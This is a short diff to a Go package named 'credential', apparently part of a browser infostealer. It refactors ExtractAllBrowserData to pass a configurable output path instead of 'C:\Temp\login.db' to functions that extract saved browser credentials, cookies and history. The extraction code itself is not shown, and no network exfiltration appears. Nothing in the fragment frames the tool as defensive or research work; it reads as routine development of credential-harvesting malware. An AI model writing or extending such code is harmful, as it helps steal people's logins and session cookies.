@@ -4,6 +4,7 @@ package credential
 
 import (
 "os/exec"
+"strings"
 )
 
 func ExtractBrowserCredentials(outputPath string) bool {
@@ -33,8 +34,8 @@ return false
 return true
 }
 
-func ExtractAllBrowserData() bool {
-ExtractBrowserCredentials("C:\\Temp\\login.db")
+func ExtractAllBrowserData(outputPath string) bool {
+ExtractBrowserCredentials(outputPath)
 ExtractBrowserCookies()
 ExtractBrowserHistory()
 return true
